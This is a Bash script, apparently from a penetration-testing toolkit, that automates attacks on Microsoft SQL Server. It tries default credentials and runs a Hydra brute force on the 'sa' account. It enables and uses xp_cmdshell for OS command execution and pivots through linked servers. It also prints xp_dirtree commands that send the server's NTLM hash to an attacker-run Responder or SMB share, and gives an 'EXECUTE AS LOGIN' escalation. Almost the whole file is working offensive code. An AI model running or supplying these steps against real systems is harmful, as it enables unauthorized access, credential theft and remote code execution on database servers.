#!/usr/bin/env bash
# ╔══════════════════════════════════════╗
# ║   Auto-Enum — MSSQL (1433)          ║
# ║   Usage: ./enum_mssql.sh <TARGET> [USER] [PASS] [DOMAIN]
# ╚══════════════════════════════════════╝
source "$(dirname "$0")/lib/common.sh"

TARGET="$1"
USER="${2:-sa}"
PASS="${3:-}"
DOMAIN="${4:-}"

require_target "$TARGET"
banner "MSSQL / SQL Server (port 1433)" "$TARGET"
OUTDIR=$(setup_outdir "$TARGET" "mssql")

NXC=$(command -v nxc || command -v crackmapexec)

# ─── 1. FINGERPRINT ─────────────────────────────────────────
section "1. FINGERPRINT"

run "Nmap — MSSQL scripts" "$OUTDIR/nmap_mssql.txt" \
    nmap -sV -sC "$TARGET" -p1433 \
    --script ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-ntlm-info \
    -oN "$OUTDIR/nmap_mssql_raw.txt"

MSSQL_VER=$(grep -oP 'Microsoft SQL Server.*[\d.]+' "$OUTDIR/nmap_mssql.txt" 2>/dev/null | head -1)
[[ -n "$MSSQL_VER" ]] && finding "Version : $MSSQL_VER"

INSTANCE=$(grep -oP 'Named Pipe.*\K\\[A-Z0-9]+' "$OUTDIR/nmap_mssql.txt" 2>/dev/null | head -1)
[[ -n "$INSTANCE" ]] && finding "Instance : $INSTANCE"

# nxc fingerprint
if [[ -n "$NXC" ]]; then
    info "nxc — fingerprint MSSQL"
    $NXC mssql "$TARGET" 2>&1 | tee "$OUTDIR/nxc_info.txt"

    OS=$(grep -oP 'Windows\s+\S+(\s+\S+)?' "$OUTDIR/nxc_info.txt" 2>/dev/null | head -1)
    [[ -n "$OS" ]] && finding "OS : $OS"
fi

# ─── 2. AUTHENTIFICATION ────────────────────────────────────
section "2. AUTHENTIFICATION"

DEFAULT_CREDS=(
    "sa:"
    "sa:sa"
    "sa:password"
    "sa:Password1"
    "sa:sqlpassword"
    "sa:master"
    "admin:admin"
    "admin:password"
)

> "$OUTDIR/valid_creds.txt"

# Test creds par défaut avec impacket
if check_tool mssqlclient.py; then
    for cred in "${DEFAULT_CREDS[@]}"; do
        u="${cred%%:*}"
        p="${cred##*:}"
        info "Test $u:${p:-<empty>}"
        RESULT=$(timeout 8 mssqlclient.py "${u}:${p}@${TARGET}" \
            -q "SELECT 1;" 2>&1)
        if echo "$RESULT" | grep -q "1\b"; then
            success "ACCÈS TROUVÉ : $u:${p:-<empty>}"
            echo "$u:$p" >> "$OUTDIR/valid_creds.txt"
            break
        fi
    done
fi

# Test avec nxc
if [[ -n "$NXC" ]]; then
    if [[ -n "$PASS" ]]; then
        info "Test fourni : $USER:$PASS"
        DOMAIN_FLAG=""
        [[ -n "$DOMAIN" ]] && DOMAIN_FLAG="-d $DOMAIN"
        $NXC mssql "$TARGET" -u "$USER" -p "$PASS" $DOMAIN_FLAG 2>&1 | tee "$OUTDIR/auth_test.txt"
        if grep -q "\[+\]" "$OUTDIR/auth_test.txt"; then
            success "ACCÈS MSSQL VALIDE !"
            echo "$USER:$PASS" >> "$OUTDIR/valid_creds.txt"
        fi
    fi

    # Test Windows Auth
    if [[ -n "$DOMAIN" && -n "$USER" && -n "$PASS" ]]; then
        info "Test Windows Auth (domaine)"
        $NXC mssql "$TARGET" -u "$USER" -p "$PASS" -d "$DOMAIN" -q "SELECT SYSTEM_USER;" \
            2>&1 | tee "$OUTDIR/winauth.txt"
        grep "\[+\]" "$OUTDIR/winauth.txt" 2>/dev/null && \
            echo "$USER:$PASS (Windows Auth)" >> "$OUTDIR/valid_creds.txt"
    fi
fi

# Hydra brute force
if [[ ! -s "$OUTDIR/valid_creds.txt" ]] && check_tool hydra; then
    warn "Brute force Hydra MSSQL (timeout 90s)"
    run_long "Hydra MSSQL" "$OUTDIR/hydra.txt" 90 \
        hydra -l sa -P /usr/share/wordlists/rockyou.txt -t 4 \
        mssql://"$TARGET"
    grep "login:\|password:" "$OUTDIR/hydra.txt" 2>/dev/null | \
        tee -a "$OUTDIR/valid_creds.txt"
fi

# Empty password nmap
if grep -qi "empty.*password\|login.*\[\]" "$OUTDIR/nmap_mssql.txt" 2>/dev/null; then
    success "Empty password détecté par nmap !"
    echo "sa:" >> "$OUTDIR/valid_creds.txt"
fi

# ─── 3. ENUM POST-CONNEXION ─────────────────────────────────
if [[ -s "$OUTDIR/valid_creds.txt" ]] && [[ -n "$NXC" ]]; then
    VALID_LINE=$(head -1 "$OUTDIR/valid_creds.txt")
    V_USER="${VALID_LINE%%:*}"
    V_PASS="${VALID_LINE##*:}"

    DOMAIN_FLAG=""
    [[ -n "$DOMAIN" ]] && DOMAIN_FLAG="-d $DOMAIN"

    section "3. ÉNUMÉRATION POST-CONNEXION ($V_USER)"

    NXC_AUTH="$NXC mssql $TARGET -u $V_USER -p $V_PASS $DOMAIN_FLAG"

    # Info serveur
    info "Informations serveur"
    $NXC_AUTH -q "SELECT @@VERSION; SELECT SYSTEM_USER; SELECT DB_NAME();" \
        2>&1 | tee "$OUTDIR/server_info.txt"

    # Databases
    info "Listing bases de données"
    $NXC_AUTH -q "SELECT name FROM master.sys.databases;" \
        2>&1 | tee "$OUTDIR/databases.txt"

    # Role sysadmin
    info "Check rôle sysadmin"
    $NXC_AUTH -q "SELECT IS_SRVROLEMEMBER('sysadmin');" \
        2>&1 | tee "$OUTDIR/sysadmin_check.txt"
    if grep -q "^1$\b" "$OUTDIR/sysadmin_check.txt" 2>/dev/null; then
        finding "SYSADMIN ROLE ACTIF !"
        echo "SYSADMIN" >> "$OUTDIR/findings.txt"
    fi

    # xp_cmdshell
    section "4. XP_CMDSHELL"

    info "Check xp_cmdshell"
    $NXC_AUTH -q "EXEC xp_cmdshell 'whoami';" 2>&1 | tee "$OUTDIR/xp_cmdshell_test.txt"

    if grep -qi "nt authority\|nt service\|Error: 15281\|disabled" "$OUTDIR/xp_cmdshell_test.txt" 2>/dev/null; then
        if grep -qi "nt authority\|nt service" "$OUTDIR/xp_cmdshell_test.txt"; then
            success "XP_CMDSHELL ACTIF ! Exec en tant que : $(grep -oP 'nt \w+\\?\w+' "$OUTDIR/xp_cmdshell_test.txt" | head -1)"
            echo "XP_CMDSHELL_ACTIVE" >> "$OUTDIR/findings.txt"
        else
            info "xp_cmdshell désactivé — tentative d'activation (nécessite sysadmin)"
            $NXC_AUTH -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
                          EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" 2>&1 | \
                          tee "$OUTDIR/enable_xpcmd.txt"

            $NXC_AUTH -q "EXEC xp_cmdshell 'whoami';" 2>&1 | tee "$OUTDIR/xp_cmdshell_enabled.txt"
            if grep -qi "nt authority\|nt service" "$OUTDIR/xp_cmdshell_enabled.txt"; then
                success "XP_CMDSHELL ACTIVÉ ET FONCTIONNEL !"
                echo "XP_CMDSHELL_ENABLED" >> "$OUTDIR/findings.txt"
            fi
        fi
    fi

    # Commandes utiles via xp_cmdshell
    if grep -q "XP_CMDSHELL" "$OUTDIR/findings.txt" 2>/dev/null; then
        info "Enum système via xp_cmdshell"
        for CMD in "whoami /all" "net user" "net localgroup administrators" "ipconfig /all" "hostname"; do
            info "Exec : $CMD"
            $NXC_AUTH -q "EXEC xp_cmdshell '$CMD';" 2>&1 | tee "$OUTDIR/cmd_$(echo $CMD | tr ' /' '__').txt"
        done
    fi

    # ─── Linked Servers ─────────────────────────────────────
    section "5. LINKED SERVERS"

    info "Listing des serveurs liés"
    $NXC_AUTH -q "EXEC sp_linkedservers;" 2>&1 | tee "$OUTDIR/linked_servers.txt"

    LINKED=$(grep -v "^Server\|^-\|^\s*$" "$OUTDIR/linked_servers.txt" 2>/dev/null | head -5)
    if [[ -n "$LINKED" ]]; then
        finding "Serveurs liés trouvés !"
        echo "$LINKED"

        # Enum sur le premier serveur lié
        LINKED_SRV=$(echo "$LINKED" | head -1 | awk '{print $1}')
        if [[ -n "$LINKED_SRV" ]]; then
            info "Enum sur le serveur lié : $LINKED_SRV"
            $NXC_AUTH -q "EXEC ('SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [$LINKED_SRV];" \
                2>&1 | tee "$OUTDIR/linked_${LINKED_SRV}_enum.txt"

            if grep -q "^1" "$OUTDIR/linked_${LINKED_SRV}_enum.txt" 2>/dev/null; then
                finding "SYSADMIN sur le serveur lié $LINKED_SRV !"
                echo "LINKED_SYSADMIN_$LINKED_SRV" >> "$OUTDIR/findings.txt"

                # xp_cmdshell via linked server
                $NXC_AUTH -q "EXEC ('EXEC xp_cmdshell ''whoami''') AT [$LINKED_SRV];" \
                    2>&1 | tee "$OUTDIR/linked_${LINKED_SRV}_cmd.txt"
            fi
        fi
    fi

    # ─── NTLM Hash Stealing ─────────────────────────────────
    section "6. NTLM HASH STEALING"

    info "Vol de hash NTLM via xp_dirtree"
    warn "Démarrer Responder/Impacket d'abord : sudo responder -I tun0 -wv"
    info "ou : sudo impacket-smbserver share /tmp -smb2support"

    LHOST=$(ip route get 1 2>/dev/null | awk '{print $NF;exit}')
    [[ -z "$LHOST" ]] && LHOST="VOTRE_IP"

    STEAL_CMD="EXEC xp_dirtree '\\\\${LHOST}\\share\\', 1, 1;"
    info "Commande de vol de hash (à exécuter manuellement) :"
    echo -e "${CYAN}  $NXC mssql $TARGET -u $V_USER -p $V_PASS -q \"$STEAL_CMD\"${NC}"
    echo ""
    STEAL_CMD2="EXEC xp_subdirs '\\\\${LHOST}\\share\\';"
    info "Alternative xp_subdirs :"
    echo -e "${CYAN}  $NXC mssql $TARGET -u $V_USER -p $V_PASS -q \"$STEAL_CMD2\"${NC}"

    # Impersonation
    section "7. IMPERSONATION UTILISATEURS"

    info "Check impersonate privileges"
    $NXC_AUTH -q "SELECT DISTINCT b.name FROM sys.server_permissions a
                  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
                  WHERE a.permission_name = 'IMPERSONATE';" \
        2>&1 | tee "$OUTDIR/impersonate.txt"

    if grep -v "^Server\|^-\|^\s*$" "$OUTDIR/impersonate.txt" 2>/dev/null | grep -q "."; then
        finding "Impersonation possible !"
        info "Commandes d'escalade :"
        echo -e "${CYAN}  EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; REVERT;${NC}"
    fi
fi

# ─── SUMMARY ────────────────────────────────────────────────
summary "$OUTDIR"

echo -e "${WHITE}━━━ RÉSUMÉ RAPIDE ━━━${NC}"
[[ -n "$MSSQL_VER" ]] && info "Version : $MSSQL_VER"

[[ -s "$OUTDIR/valid_creds.txt" ]] && {
    echo ""
    success "Credentials valides :"
    cat "$OUTDIR/valid_creds.txt"
}

[[ -s "$OUTDIR/findings.txt" ]] && {
    echo ""
    warn "FINDINGS IMPORTANTS :"
    cat "$OUTDIR/findings.txt"
}
